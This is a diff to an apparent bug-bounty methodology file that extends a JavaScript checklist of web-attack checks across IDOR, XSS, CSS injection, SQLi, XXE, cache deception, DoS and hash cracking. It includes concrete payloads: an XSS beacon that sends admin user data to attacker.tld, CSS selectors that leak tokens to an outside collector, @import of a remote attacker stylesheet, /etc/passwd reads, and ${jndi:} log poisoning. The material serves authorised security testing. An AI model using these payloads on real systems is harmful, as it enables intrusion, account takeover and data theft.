@@ -454,8 +454,10 @@ const CHECKLIST = [
 			"Swap direction discipline: only attacker->victim in default mode (reverse proves nothing and creates noise); per-key attacker/victim overrides, and pool-swap between any two previously observed IDs of the same key when no labelled pair exists",
 			"Boundary battery: 0, -1, 999999999, off-by-one (+1/-1), same-length random ID, UUID segment mutations, sibling IDs (+1/-1), parent collection IDs, remove the ID param entirely, null/empty value",
 			"Operational hygiene: skip OPTIONS, dedupe already-tested URLs, cap response comparison at ~4 KB (prefix compare for huge bodies), rebuild Content-Length after a body swap, HTML-skip toggle so generic pages don't register findings",
+		"Derivative-endpoint permission bypass: primary endpoints enforce auth but scan/preview/export/print twins don't \u2014 test /scan, /preview, /export, /print variants of every protected resource",
+		"Live-ID polling + auth-inheritance probing: poll last_message_id / event-sideband endpoints for newly created object IDs (new-entity enumeration), and probe unprotected subdirectories of authenticated areas for missing auth inheritance",
 		],
-		techniques: ["bb_wayback_urls (find id params)", "burp auth analyzer", "role swap", "method override", "Base64 ID swap", "Burp Intruder enumeration"]
+		techniques: ["bb_wayback_urls (find id params)", "burp auth analyzer", "role swap", "method override", "Base64 ID swap", "Burp Intruder enumeration", "derivative-endpoint (scan/preview/export)", "live-ID polling", "auth-inheritance subdir probes"]
 	},
 	{
 		slug: "ssrf",
@@ -499,9 +501,10 @@ const CHECKLIST = [
 			"Lifecycle tests: session survives logout (old token still works), survives password change (replay session A), not regenerated on login (session fixation — compare token before/after login)",
 			"Session fixation chain: craft a link carrying a pre-set session ID, victim authenticates into it, attacker replays it",
 			"Missing post-logout invalidation — old session token still valid after logout, replay on protected endpoints",
-			"Validation discipline: use TWO real sessions (attacker A + victim B), body-diff every 200, OOB confirmation for theft chains; standalone attribute gaps are Low/Informational"
+			"Validation discipline: use TWO real sessions (attacker A + victim B), body-diff every 200, OOB confirmation for theft chains; standalone attribute gaps are Low/Informational",
+		"Unsigned serialized/signed-cookie privilege flip: base64 JSON cookies (decode -> flip role/admin flags -> re-encode), Flask/Django-style signed cookies with a leaked/weak SECRET_KEY (django-session-forger, flask-unsign), pickle cookies \u2014 enumerate which session format the app uses before tampering",
 		],
-		techniques: ["bb_security_headers", "jwt_tool", "hashcat", "host header injection", "EditThisCookie", "session lifecycle tests"]
+		techniques: ["bb_security_headers", "jwt_tool", "hashcat", "host header injection", "EditThisCookie", "session lifecycle tests", "serialized/signed cookie flip (flask-unsign, django-session-forger)"]
 	},
 	{
 		slug: "xss",
@@ -526,9 +529,21 @@ const CHECKLIST = [
 			"XSS -> ATO beacon payload: fetch('/api/admin/users',{credentials:'include'}).then(r=>r.json()).then(d=>navigator.sendBeacon('https://attacker.tld/',JSON.stringify(d)))",
 			"Widget/embed macro stored XSS: unvalidated sub-parameter concatenated into a trusted-host script URL (Confluence Widget Connector) — reflect the sub-param into the widget src and it executes for every page viewer",
 			"XSS -> token-minting escalation: injected JS mints a Personal Access Token, then swaps to Bearer API auth — full API takeover beyond cookie theft; test whether the token mint endpoint needs CSRF + whether PATs outlive sessions",
-			"Serialized share/state URL stored XSS: filter_list/load_filter-style UI state persisted in a shareable URL and rendered unsanitized for every viewer — poison the state param, victim opens link, XSS fires on their session"
+			"Serialized share/state URL stored XSS: filter_list/load_filter-style UI state persisted in a shareable URL and rendered unsanitized for every viewer — poison the state param, victim opens link, XSS fires on their session",
+		"Sanitizer/encoding-differential bypass battery: probe the FILTER's parser against the RENDERER's parser, not just the payload \u2014 multi-line DOCTYPE/<script> split across \\n in filtered constructs, click-vs-paste decoding flips (browser decodes pasted %26 as &), Accept-header-driven response-type switching (jQuery <1.12 auto-executes JS responses to text/html XHR)",
+		"Non-script markup redirect primitives in rich-text/macro sinks: <meta http-equiv=refresh>, <iframe src>, <base href> \u2014 where <script> is stripped, markup-only redirects still phish and chain; search-indexed delivery of stored markup",
+		"JSONP closure-breakout payload grammar: })];alert(1)// appended after the callback body \u2014 test callback=, jsonp=, cb= params for reflection inside the JS context (harvest candidates via api-misconfig JSONP grep)",
+		"Path-segment (non-query) reflection probes: /xss/<payload> in addition to ?q=<payload> \u2014 path reflections often lack the query-param WAF rules; framework URL-propagation sinks (AngularJS $location.absUrl, ng-bind-html)",
+		"Template-literal WAF-bypass shape: print`<svg/onload=alert(1)>` \u2014 backtick function calls evade regexes matching print(, alert(, and parens",
 		],
-		techniques: ["bb_wayback_urls (find params)", "burp collaborator", "XSS hunter", "CSP evaluator", "gau", "gf xss", "Gxss", "kxss", "dalfox", "httpx-toolkit -ct", "stored-XSS grep | nuclei critical,high", "widget macro sub-param", "PAT token minting", "serialized UI-state stored XSS"]
+		techniques: ["bb_wayback_urls (find params)", "burp collaborator", "XSS hunter", "CSP evaluator", "gau", "gf xss", "Gxss", "kxss", "dalfox", "httpx-toolkit -ct", "stored-XSS grep | nuclei critical,high", "widget macro sub-param", "PAT token minting", "serialized UI-state stored XSS", "sanitizer parser-differential", "JSONP closure-breakout", "template-literal backtick payloads", "path-segment reflection"]
+	},
+	{
+		slug: "css-injection",
+		name: "CSS Injection & RPO",
+		description: "Stylesheet-level injection: style-attribute/sink injection, attribute-selector exfil oracles, @import/url() beacons, and Relative Path Overwrite (RPO).",
+		checks: ["Style-sink injection: style= attribute, <style> in stored HTML, CSS-in-JS template params \u2014 CSS can READ attribute values, not just decorate; inject an attribute selector (input[name^='tok'], .account[data-user]) and exfil matched values via background-image:url(//collab/?d=...)", "Exfil oracle: input[name^=secret] { background: url(https://collab/x) } fires when the field value starts with the prefix \u2014 bisect one character at a time to recover tokens without JS executing", "@import/url() beacons: injected url() loads attacker hosts; @import '//attacker/style.css' pulls a remote stylesheet that re-styles the page for UI-redress phishing (override .login-box, swap form targets)", "RPO (Relative Path Overwrite): /path/../style.css on a page whose relative asset URLs resolve against the (attacker-influenced) path \u2014 inject content into the path so the browser loads attacker CSS/JS from the same origin (same-origin XSS with no injection point)", "CSS keylogging legacy: input[type=password][name^=p] { background:url(//c/?x=p) } attribute prefixes \u2014 modern browsers drop some selectors; verify which fire in the target engine (engine-differential check, cf. video/mp2t-on-WebKit)", "Impact framing: CSS-only impact is usually Low-Medium \u2014 chain to phishing/UI-redress or token theft via attribute exfil; pair with dom-attacks for a JS-enabled escalation", "Detection: grep stored-content sinks for style/class/background/url( params; verify the value reflects unescaped into a <style> or style= context, not just a class attribute"],
+		techniques: ["attribute-selector exfil oracle", "background-image beacons", "RPO path-confusion", "@import remote stylesheet", "CSS keylogging legacy", "engine-differential selector check"],
 	},
 	{
 		slug: "sqli",
@@ -545,9 +560,19 @@ const CHECKLIST = [
 			"ORDER BY injection (un-parameterizable column, most WAFs miss it): sort=(CASE WHEN (SELECT version() LIKE 'PostgreSQL%') THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)",
 			"Header-based second-order: User-Agent: ' AND SLEEP(5)-- — bypasses parameter-focused WAF rules because headers are treated as trusted server metadata",
 			"Statistical timing proof (false-positive killer): run 10 baseline + 10 injected requests; mean injected time must exceed mean baseline by >= the sleep duration AND stddev < sleep/3 — a single slow response is not proof",
-			"Boolean-blind binary-search extraction protocol: establish a body-content oracle (true = matching row count / distinctive body marker), then binary-search ASCII per character (name > 'm' style) — 7 probes/char with a stable oracle, not 255"
+			"Boolean-blind binary-search extraction protocol: establish a body-content oracle (true = matching row count / distinctive body marker), then binary-search ASCII per character (name > 'm' style) — 7 probes/char with a stable oracle, not 255",
+		"Nested double-UNION: UNION SELECT inside a subquery UNION SELECT (UNION(SELECT(UNION(SELECT 1))) \u2014 defeats single-pass UNION filters and some WAF rules",
+		"Oracle blind primitives: sort-order oracle (sort param ascending/descending reveals row order), exists/not-found body diff (row-existence vs row-count), short-ID guessing (enumerate sequential numeric IDs in WHERE clauses), /batch API cap divergence (batch endpoint validates fewer rows than the single endpoint)",
+		"Query-language/expression injection beyond SQL: Jira JQL (project=X OR reporter=admin), SpEL/OGNL in query params, Solr/Elasticsearch query syntax \u2014 error-forcing then privileged-function expansion (see second-order-injection)",
 		],
-		techniques: ["sqlmap", "burp intruder", "error fingerprinting", "WAF bypass", "boolean-blind binary-search oracle"]
+		techniques: ["sqlmap", "burp intruder", "error fingerprinting", "WAF bypass", "boolean-blind binary-search oracle", "Oracle sort-order oracle", "nested double-UNION", "JQL/expression-language injection"]
+	},
+	{
+		slug: "second-order-injection",
+		name: "Second-Order Injection",
+		description: "Payload stored in one field/sink, executed later in a different sink: stored SQLi, stored XSS in admin/export surfaces, stored values into templates, emails, or commands.",
+		checks: ["Field-to-sink inventory: list every stored field (name, display name, org, address, bio, title, avatar URL) and every sink that later renders or queries it (admin tables, CSV/PDF export, email templates, search/WHERE clauses, serialization, template render) \u2014 a payload that does nothing at input fires at the sink", "Second-order SQLi: inject into a field that is later interpolated into a query (sort-by-user-name, filter-by-org) \u2014 payloads only trigger on SELECT/ORDER/GROUP paths, test the consuming endpoint not the input", "Second-order XSS via admin/approval surfaces: stored payload in a user-controlled field rendered in an internal admin panel, moderation queue, or approval email (blind delivery \u2014 see blind-xss)", "Second-order in exports: CSV/PDF/Excel generators re-render stored values \u2014 formula injection in CSV, HTML in PDF, XML-breaking values in XML exports (see csv-injection under email-field)", "Stored value to template/command sink: values interpolated into template engines (second-order SSTI) or shell commands (second-order CMDi \u2014 a filename/user-controlled string reaching system()/exec)", "Proving second-order: the input step alone shows nothing \u2014 reproduce the full chain with the payload surviving persistence (re-login, new session, second user) and firing at the sink; document both requests in the report"],
+		techniques: ["field-to-sink inventory", "stored-to-admin-panel delivery", "second-order SQLi/XSS/CMDi/SSTI", "export re-render chain", "two-request proof"],
 	},
 	{
 		slug: "business-logic",
@@ -563,9 +588,12 @@ const CHECKLIST = [
 			"Coupon stacking + parallel single-use coupon race; remove item after discount",
 			"Multi-step workflow state-token bypass; limited-quantity item races",
 			"Deleted-entity lifecycle regression: soft-deleted/archived objects keep their side effects — deleted user still receives email notifications, removed payment method still charges, cancelled subscription still renews, removed member still holds API access — enumerate lifecycle endpoints (cancel, archive, remove, revoke) and re-check the entity's downstream behavior after each state transition",
-			"Enum value-range diffing: enumerate every enum/state field's accepted values client-side (swagger enums, JS constants) vs server-side implementation — values the doc declares but the server never validates, and values the server accepts that the client never offers — a status='suspended' flag or gift_code_state accepted server-side that the UI can't set is a privilege/business-rule gap"
+			"Enum value-range diffing: enumerate every enum/state field's accepted values client-side (swagger enums, JS constants) vs server-side implementation — values the doc declares but the server never validates, and values the server accepts that the client never offers — a status='suspended' flag or gift_code_state accepted server-side that the UI can't set is a privilege/business-rule gap",
+		"Feature-gate/entitlement bypass: beta/waitlist/rollout features gated client-side (hidden flag, disabled button) or by an overridable param (?beta=1, feature_flags[]=new_checkout) \u2014 enumerate feature_flag/beta/rollout params and diff entitlements across accounts",
+		"Gamification/reputation abuse: leaderboard/rank/points endpoints that self-credit without an authorization gate \u2014 self-service APIs that award points, referral loops, points-pool mixing across accounts",
+		"Team-invite role escalation: invitation objects carry a role field \u2014 create an invite as member, swap role=admin before the invitee accepts, or accept with a role override",
 		],
-		techniques: ["burp turbo intruder", "race condition patterns", "negative value fuzzing", "lifecycle state-transition sweeps", "enum brute-vs-implemented diff"]
+		techniques: ["burp turbo intruder", "race condition patterns", "negative value fuzzing", "lifecycle state-transition sweeps", "enum brute-vs-implemented diff", "feature-gate param enumeration", "gamification self-credit APIs", "invite-role swap"]
 	},
 	{
 		slug: "api-misconfig",
@@ -583,9 +611,11 @@ const CHECKLIST = [
 			"Documentation rot: diff /openapi.json + /swagger.json (live + wayback) against live probes — missing endpoints exist, declared endpoints are gone",
 			"JSONP/CORS candidate harvest: grep -E \"(\\?|&)(callback|jsonp|cb|_callback)=\" over collected URLs",
 			"BOLA/BFLA endpoint targets: /admin/users, /admin/audit-logs, impersonate, role-change; BFLA test = admin-level call with a regular-user JWT; Swagger UI pre-filled real tokens; API-key echo in response headers",
-			"Rate-limit bypass via header rotation X-Forwarded-For/X-Real-IP/True-Client-IP/CF-Connecting-IP + method swap POST<->GET"
+			"Rate-limit bypass via header rotation X-Forwarded-For/X-Real-IP/True-Client-IP/CF-Connecting-IP + method swap POST<->GET",
+		"Low-code/platform internal-resource enumeration: Retool/Appsmith-class auto-provisioned per-app databases and credential endpoints (/api/apps/<id>/datasource, query-result caches) \u2014 internal resources often lack the parent app's auth",
+		"Webhook/lifecycle ingress authn: unauthenticated webhook handlers (no signature verification, no auth) \u2014 event forgery, replay, and DoS; provider-account identifiers in the path (PagerDuty/AoJ cloudId class) = cross-tenant DoS if unvalidated",
 		],
-		techniques: ["bb_wayback_urls (find api paths)", "graphql introspection", "mass assignment", "ffuf api wordlists"]
+		techniques: ["bb_wayback_urls (find api paths)", "graphql introspection", "mass assignment", "ffuf api wordlists", "Retool/Appsmith internal endpoints", "webhook signature validation"]
 	},
 	{
 		slug: "subdomain-takeover",
@@ -603,9 +633,11 @@ const CHECKLIST = [
 			"Automation: subjack -w subs.txt -t 100 -timeout 30 -ssl -c fingerprints.json ; subzy run --targets subs.txt",
 			"Dangling CNAME at an OAuth redirect_uri = account takeover — confirmation is the code actually arriving at the claimed host",
 			"CloudFront dangling: CNAME -> cloudfront.net + HTTP 403 + body 'Bad request' = claimable distribution",
-			"Dangling DNS provider list to test: herokuapp.com, ghost.io, azurewebsites.net, s3.amazonaws.com, surge.sh, netlify.app, readme.io"
+			"Dangling DNS provider list to test: herokuapp.com, ghost.io, azurewebsites.net, s3.amazonaws.com, surge.sh, netlify.app, readme.io",
+		"Claim unregistered GitHub namespace referenced by official docs: docs link to github.com/<org>/<repo> that 404s \u2014 registering the org/repo lets you serve content on the trusted doc domain's links",
+		"Shopify-specific fingerprint: deleted-shop page (404 with missing-shop body) \u2014 claim the myshopify name and serve content under the dead subdomain",
 		],
-		techniques: ["bb_enum_subdomains", "dig CNAME", "nuclei takeover templates", "can-i-take-over-xyz", "subzy run --concurrency 100 --hide_fails --verify_ssl"]
+		techniques: ["bb_enum_subdomains", "dig CNAME", "nuclei takeover templates", "can-i-take-over-xyz", "subzy run --concurrency 100 --hide_fails --verify_ssl", "GitHub namespace claim", "Shopify deleted-shop fingerprint"]
 	},
 	{
 		slug: "reporting",
@@ -625,9 +657,12 @@ const CHECKLIST = [
 			"Finding output contract: Title/Severity/Confidence/Attack Prerequisites/Endpoint/Attack Path/Why Exploitable/Realistic Impact/PoC Request/Suggested Verification/Fix",
 			"ONLY-report classes + minimum evidence: raw HTTP, expected vs actual, concrete impact; hard exclusions: missing headers, clickjacking w/o PoC, rate-limit w/o bypass, unconfirmed version CVEs, self-XSS, CSRF on login/logout",
 			"CVSS v3.1 quick table: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H=10.0; stored-XSS-ATO example 8.7; severity decision matrix + downgrade conditions",
-			"Per-platform formats: HackerOne/Bugcrowd/Intigriti/YesWeHack markdown templates + triager checklists + rejection triggers + tone rules; platform severity mapping (H1 CVSS ranges / BC P1-P5 / IGT / YWH)"
+			"Per-platform formats: HackerOne/Bugcrowd/Intigriti/YesWeHack markdown templates + triager checklists + rejection triggers + tone rules; platform severity mapping (H1 CVSS ranges / BC P1-P5 / IGT / YWH)",
+		"PII-content severity table: signatures, ID-document numbers, addresses, phones in a leak = forgery/identity-theft impact (Critical) vs bulk emails (High); frame privacy-law impact (GDPR/CCPA) alongside data-leak $ metrics",
+		"Third-party-hosted data provenance gate: dork/paste findings must prove artifact ownership + in-scope hosting \u2014 reject third-party-hosted or non-org data (a leak on someone else's bucket/pastebin is not your target's finding)",
+		"Intended-behavior verification gate: before reporting reset-token/link findings verify intended multi-use semantics (some flows legitimately allow N uses) \u2014 a reusable token the product documents as reusable is informational, not a bug",
 		],
-		techniques: ["CVSS scoring", "hackerone/other program docs", "writeup templates"]
+		techniques: ["CVSS scoring", "hackerone/other program docs", "writeup templates", "PII severity table", "provenance gate", "intended-behavior gate"]
 	},
 	{
 		slug: "csrf-open-redirect",
@@ -761,9 +796,10 @@ const CHECKLIST = [
 			"Use GBK-encoded CR/LF /%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=coffinxp when plain %0d%0a is blocked",
 			"CRLF-to-XSS with GBK angle brackets /%E5%98%8D%E5%98%8A...%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE; look for executable JS",
 			"Change ?page=home to ?page=home%0d%0aSet-Cookie:crlf=1 in Repeater; look for new headers or broken layout",
-			"Scale with nuclei -t cRlf.yaml over a subfinder subdomain list; look for domains crlfuzz misses"
+			"Scale with nuclei -t cRlf.yaml over a subfinder subdomain list; look for domains crlfuzz misses",
+		"Log-injection sibling: control bytes in the request line/params land verbatim in framework logs \u2014 forge security-audit logs, poison log4j-style processors with ${jndi:} in logged fields, and crash log parsers with NUL/binary",
 		],
-		techniques: ["%0d%0a / %0a / %00%0d%0a variants", "GBK-encoded CR/LF %E5%98%8D%E5%98%8A", "nuclei cRlf.yaml", "loxs mass-CRLF scanner"]
+		techniques: ["%0d%0a / %0a / %00%0d%0a variants", "GBK-encoded CR/LF %E5%98%8D%E5%98%8A", "nuclei cRlf.yaml", "loxs mass-CRLF scanner", "log-injection control bytes"]
 	},
 	{
 		slug: "host-header",
@@ -803,9 +839,10 @@ const CHECKLIST = [
 			"OTP math: 6-digit OTP = 1,000,000 combinations — the full 000000-999999 keyspace is reachable if no per-attempt limit",
 			"Token-entropy bar: any 'weak token' claim must be backed by an actual measurement (Burp Sequencer effective bits, ent, or demonstrated counter/timestamp structure)",
 			"ReDoS bar: super-linear (doubling) latency growth against a benign-control comparison; linear growth is not ReDoS",
-			"Path-trick trio when a limit exists: /api/login vs /api/login/ vs /api/login.json"
+			"Path-trick trio when a limit exists: /api/login vs /api/login/ vs /api/login.json",
+		"Per-account/per-recipient limiting semantics: email-blast/bulk endpoints (invite, notify, share) count per-REQUEST not per-recipient \u2014 one call with N recipients bypasses the limit; test recipient-array requests",
 		],
-		techniques: ["X-Forwarded-For/True-Client-IP/CF-Connecting-IP rotation", "mirror endpoint enumeration", "method + param-name switching", "proxychains / IP rotation", "OTP/2FA endpoint targeting"]
+		techniques: ["X-Forwarded-For/True-Client-IP/CF-Connecting-IP rotation", "mirror endpoint enumeration", "method + param-name switching", "proxychains / IP rotation", "OTP/2FA endpoint targeting", "per-recipient bulk-email semantics"]
 	},
 	{
 		slug: "403-bypass",
@@ -949,9 +986,12 @@ const CHECKLIST = [
 			"Atlassian Data Center playbook: WebWork/OGNL endpoint matrix — POST /pages/doenterpagevariables.action (CVE-2021-26084, untrusted linkCreation=... param, pre-auth), /signup.action?token= (unauth when self-signup is on), /users/darkfeatures.action?featureKey= (auth), /pages/docreatepagefromtemplate.action?newSpaceKey=<space>&sourceTemplateId= (auth, patched 7.12.14/7.13.8/7.14.8 — test below these); pair with the Hazelcast 5701 cluster plane (see deserialization)",
 			"Oracle Forms legacy-CVE line: WebUtil_* param battery — WebUtil_Run_Class, WebUtil_Cluster_Class, WebUtil_Cluster_Server, WebUtil_Cluster_Fig, WebUtil_Obj_Security, WebUtil_Logger_File, WebUtil_Enable_Internals (RCE / cluster abuse, late-1990s WebUtil still shipping on enterprise Forms deployments)",
 			"Nginx range-filter CVE-2017-7529 battery (old nginx on consumer-router firmware / embedded appliances): send Range headers crossing the 0x8000000000000000 overflow boundary (e.g. Range: bytes=-X with huge or -1728989259139571198-style arithmetic) against a cached static resource — 206 with leaked adjacent cache-file bytes = the flaw; fingerprint nginx version first (Server header, /nginx.conf error pages) since modern 1.12.1+/1.13.3+ patched it",
-			"Consumer-router / embedded firmware CVE battery: fingerprint the appliance (login portal, JS bundle, favicon hash) then cross-reference its bundled-service versions — old nginx/lighttpd/boa, BusyBox httpd, unpatched php 5.x, iptables-web shells — e.g. Zyxel/TP-Link/ASUS-era admin panels with known pre-auth RCEs; vendor EoL devices never get patched, so confirmed CVEs are Critical regardless of the device's age"
+			"Consumer-router / embedded firmware CVE battery: fingerprint the appliance (login portal, JS bundle, favicon hash) then cross-reference its bundled-service versions — old nginx/lighttpd/boa, BusyBox httpd, unpatched php 5.x, iptables-web shells — e.g. Zyxel/TP-Link/ASUS-era admin panels with known pre-auth RCEs; vendor EoL devices never get patched, so confirmed CVEs are Critical regardless of the device's age",
+		"Cisco ASA CVE-2018-0296 traversal battery: /+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions \u2014 the +CSCOU+->+CSCOE+ scheme (back-to-back path segments) defeats ASA URL validation; probe file_list.json/file_details.json on every ASA-class VPN portal",
+		"jQuery <1.12 XHR content-type auto-exec: a response the server labels text/html gets auto-executed as JS by jQuery's transport layer \u2014 pairs with the Accept-header differential (an endpoint that reflects Accept: text/html instead of honoring application/json becomes a DOM-XSS delivery)",
+		"Patch-diff variant hunting: for any published framework CVE, diff the fixing commit and re-test the code path with the missed variants (adjacent params, alternate encodings, sibling endpoints) \u2014 incomplete fixes are the highest-value follow-ups; verify the patched state returns an expected 404, not a silent 200",
 		],
-		techniques: ["x-middleware-subrequest + x-middleware-rewrite probes", "coffinxp nuclei-templates (nextjs-middleware-cache.yaml)", "Grafana icon_hash 2123863676 / title dorks", "CVE-2025-29927 / CVE-2025-4123 nuclei templates", "Atlassian OGNL endpoint matrix", "Oracle Forms WebUtil battery", "nginx Range overflow CVE-2017-7529", "firmware appliance CVE cross-ref"]
+		techniques: ["x-middleware-subrequest + x-middleware-rewrite probes", "coffinxp nuclei-templates (nextjs-middleware-cache.yaml)", "Grafana icon_hash 2123863676 / title dorks", "CVE-2025-29927 / CVE-2025-4123 nuclei templates", "Atlassian OGNL endpoint matrix", "Oracle Forms WebUtil battery", "nginx Range overflow CVE-2017-7529", "firmware appliance CVE cross-ref", "Cisco ASA +CSCOU+/../+CSCOE+ 0296 battery", "jQuery<1.12 XHR auto-exec", "patch-diff variant hunting"]
 	},
 	{
 		slug: "github-recon",
@@ -1134,9 +1174,10 @@ const CHECKLIST = [
 			"Mass hunt: gau filtered to sensitive paths, append /style.css, probe httpx-toolkit -mc 200; look for 200s exposing private pages",
 			"Full exploit in authenticated-then-logged-out flow with incognito verification; look for cached account data (username, email, session_token) served to unauthenticated visitors",
 			"Cache-key analysis: send two identical requests — if Age increments the response is cached; Vary headers one-by-one to find which are NOT in the cache key (unkeyed)",
-			"Catalog to try: Cloudflare Cache-Deception Armor bypass, session-token cache deception, Akamai hop-by-hop smuggling -> server-side edge poisoning, Kettle's 2024 path-normalization WCD against Cloudflare/Fastly/GCP"
+			"Catalog to try: Cloudflare Cache-Deception Armor bypass, session-token cache deception, Akamai hop-by-hop smuggling -> server-side edge poisoning, Kettle's 2024 path-normalization WCD against Cloudflare/Fastly/GCP",
+		"Encoded-extension allowlist confusion: index%2Ephp, piwik.js, %2E%2E appended to sensitive paths \u2014 a cache that treats the decoded extension as static caches the private page; verify with X-Cache/CF-Cache-Status HIT on an unauthenticated request",
 		],
-		techniques: ["append static ext to sensitive endpoints", "X-Cache / CF-Cache-Status / Age verification", "force-cache + forwarded headers", "delimiter battery (~ \\ / ; : %60 %5c %3d)", "gau | httpx mass hunting"]
+		techniques: ["append static ext to sensitive endpoints", "X-Cache / CF-Cache-Status / Age verification", "force-cache + forwarded headers", "delimiter battery (~ \\ / ; : %60 %5c %3d)", "gau | httpx mass hunting", "encoded-extension index%2Ephp/piwik.js"]
 	},
 	{
 		slug: "wordpress",
@@ -1217,9 +1258,10 @@ const CHECKLIST = [
 			"ffuf -request lfi.txt -request-proto https -w wordlist.txt -mr 'root:' — raw-request fuzzing when the endpoint needs custom headers/cookies (copy from Burp, tweak the FUZZ line)",
 			"Test php://filter/convert.base64-encode/resource=/etc/passwd and data:// wrappers on PHP LFI params — look for base64-encoded file contents in the response",
 			"Double-encode traversal: %252e%252e%252f, %252e%252e%255c etc. to bypass filters; test both path and query injection points",
-			"Validate every hit by reading a real file (e.g. /etc/passwd root:0:0:0) — generic 'include' errors without file contents are usually not exploitable"
+			"Validate every hit by reading a real file (e.g. /etc/passwd root:0:0:0) — generic 'include' errors without file contents are usually not exploitable",
+		"Post-filter traversal bypass battery: enumerate the filter's exact replacement then craft the pre-image \u2014 str_replace single-pass removal (../ -> '') is defeated by self-nesting (....//, ....\\), single-pass %2e%2e%2f removal by double-encoding, substring filters by null-byte/encoding split (..%00/)",
 		],
-		techniques: ["gau|gf lfi|uro pipeline", "qsreplace FUZZ", "ffuf -mr root: regex match", "ffuf -request raw", "php://filter wrapper", "double-encoded traversal"]
+		techniques: ["gau|gf lfi|uro pipeline", "qsreplace FUZZ", "ffuf -mr root: regex match", "ffuf -request raw", "php://filter wrapper", "double-encoded traversal", "post-filter self-nesting bypass"]
 	},
 	{
 		slug: "cors",
@@ -1282,9 +1324,10 @@ const CHECKLIST = [
 			"XInclude: <foo xmlns:xi='http://www.w3.org/2001/XInclude'><xi:include parse='text' href='file:///etc/passwd'/></foo> — works where DTDs are blocked",
 			"SVG upload: <svg xmlns='http://www.w3.org/2000/svg' xmlns:xlink=...><image xlink:href='file:///etc/passwd'/></svg>; DOCX: swap [Content_Types].xml content-type for a ZIP re-zip and inject the DOCTYPE",
 			"SAML assertion XXE: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]> inside <saml:Assertion> — SSO parsers often run libxml with entity expansion",
-			"Curated payload sets: hacktricks XXE + payloadsallthethings XXE; validate with a benign entity (version) before escalating to file reads"
+			"Curated payload sets: hacktricks XXE + payloadsallthethings XXE; validate with a benign entity (version) before escalating to file reads",
+		"XXE-as-SSRF via wrapper chains: php://filter/read=convert.base64-encode/resource=file:///etc/passwd inside an XXE entity where the parser resolves nested wrappers \u2014 file read through SSRF-constrained XML parsers; also expect:// and data:// chains",
 		],
-		techniques: ["classic file:// read", "external-DTD OOB exfil", "error-based oracle", "XInclude bypass", "SVG/DOCX upload", "SAML assertion XXE"]
+		techniques: ["classic file:// read", "external-DTD OOB exfil", "error-based oracle", "XInclude bypass", "SVG/DOCX upload", "SAML assertion XXE", "php://filter wrapper chain"]
 	},
 	{
 		slug: "deserialization",
@@ -1372,6 +1415,13 @@ const CHECKLIST = [
 		techniques: ["identical-copies race", "partial-construction race", "Turbo Intruder single-packet", "HTTP/2 h2 race", "coupon/OTP double-redeem", "register+blank-token"]
 	},
 	{
+		slug: "dos-resource-exhaustion",
+		name: "DoS / Resource Exhaustion",
+		description: "Protocol-level and algorithmic DoS: FD/memory leaks, serialized-object heap bombs, JSON depth bombs, ReDoS, decompression bombs, unbounded loops.",
+		checks: ["Protocol-level FD/memory leaks: HTTP/2 handling bugs (Node http2 unknownProtocol FD/memory leak class), HPACK, chunked-encoding edge cases, header-count/SETTINGS floods \u2014 CVE-backed: verify a known-fixed version is NOT running before probing", "Serialized-object heap-exhaustion payloads: deeply nested JSON/XML/YAML (10k+ depth), billion-laughs XXE expansion, prototype-heavy arrays \u2014 parser stack/heap death without auth", "ReDoS: fuzz regex-using parsers with invalid-but-similar inputs (doubled reserved words, long a-runs, nested quantifiers) \u2014 measure latency spread; polynomial backtracking = CPU exhaustion per request", "Decompression bombs: zip/gzip/tar bombs in upload/file-processing endpoints (huge ratio), image bombs (PNG decompression) \u2014 disk/CPU exhaustion", "Unbounded loops/iteration: server-side pagination/aggregation looping over user-influenced counts (large limit=, sort over unbounded collections) \u2014 O(n) amplification", "JSON depth/array bombs: million-element arrays and 100k-deep nesting \u2014 parser stack overflow; memory growth via Object.keys on polluted objects (see prototype-pollution toString/valueOf)", "Rate-amplified DoS: an unauthenticated expensive endpoint (render, screenshot, PDF gen) called in a loop \u2014 cost abuse; pair with rate-limit", "Proof: reproducible request + resource impact (latency curve, FD count, memory growth, crash) \u2014 a single 500 is not a finding; document concurrency and baseline"],
+		techniques: ["HTTP/2 FD-leak CVE class", "serialized-object bombs", "ReDoS latency fuzzing", "decompression bombs", "JSON depth/array bombs", "rate-amplified expensive endpoint"],
+	},
+	{
 		slug: "nosql-injection",
 		name: "NoSQL Injection (MongoDB/Redis)",
 		description: "Operator injection in JSON/URL-param values: $ne/$gt/$regex auth bypass, $where JS injection (blind timing), array/unicode sanitizer bypasses, Redis-via-gopher SSRF.",
@@ -1448,6 +1498,13 @@ const CHECKLIST = [
 			"OTP reuse — same code accepted twice; OTP brute-force with X-Forwarded-For/X-Real-IP/CF-Connecting-IP rotation"
 		],
 		techniques: ["skip-step probe", "OTP replay", "ffuf seq -w 000000-999999", "prefix oracle", "concurrent bypass", "factor downgrade"]
+	},
+	{
+		slug: "hash-archive-cracking",
+		name: "Hash & Archive Cracking / Legacy Crypto",
+		description: "Offline cracking of hashes, archives, and weak crypto challenges: fcrackzip/hashcat batteries, weak-hash auth challenges, decodable tokens, and legacy TLS cipher audits.",
+		checks: ["Archive cracking: fcrackzip -u -l 1-6 -c a1 password-protected zips (backups, exports, config bundles); hashcat for 7z/RAR; try password reuse against known org creds before brute", "Hashcat battery: identify format (hashid / john --show) then hashcat -m <mode> \u2014 MD5 0, NTLM 1000, bcrypt 3200, WordPress 400, Joomla 400, Drupal7 7900, PBKDF2 10900; weak-hash auth: MD5/SHA1 password hashes in APIs, cookies, or client storage = offline crack to plaintext", "Weak-challenge 2FA: client-computable md5(challenge + answer) or md5(OTP) \u2014 if the client can compute the expected value the challenge is not a real factor; derive/replay without the device (see mfa-2fa-bypass)", "Decodable tokens: base64/base62/hex tokens embedding ID+timestamp+checksum \u2014 decode, flip fields, re-encode, re-fetch (see auth-session cookie tamper)", "TLS cipher-suite enumeration: ssl-enum-ciphers / testssl.sh \u2014 weak suites (RC4, 3DES) accepted = SWEET32 (CVE-2016-2183) birthday-attack territory on long-lived sessions", "Legacy protocol oracles: SSLv2/SSLv3 enabled (POODLE), EXPORT-grade ciphers, TLS compression (CRIME), cross-protocol RSA key reuse (same cert on TLS+SSH+SMTP)", "Offline-only discipline: cracking is passive/offline \u2014 